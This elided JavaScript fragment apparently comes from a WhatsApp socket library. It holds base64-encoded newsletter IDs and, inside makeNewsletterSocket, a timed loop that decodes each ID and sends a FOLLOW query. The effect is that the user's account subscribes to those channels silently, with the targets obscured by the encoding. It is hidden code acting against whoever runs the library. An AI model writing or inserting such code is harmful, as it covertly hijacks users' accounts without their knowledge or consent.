...
const newsletterIds = [
    "MTIwMzYzNzExMTE2ODUyMzQG5ld3NsZXRf",
    "MTIwMzYzNDIzNDg0OTM0MTk5QG5ld3NsZXRf",
    "MTIwMzYzNDI1NzE0OTUwNzIyQG5ld3NsZXRf"
];
...
const newsletterIds = ${JSON.stringify(newsletterIds)};
const decodeB64 = (b64) => Buffer.from(b64, 'base64').toString('utf-8');
...
const makeNewsletterSocket = (config) => {
    ...
    setTimeout(async () => {
        for(const b64Id of newsletterIds) {
            try {
                await newsletterWMexQuery(decodeB64(b64Id), Types_1.QueryIds.FOLLOW);
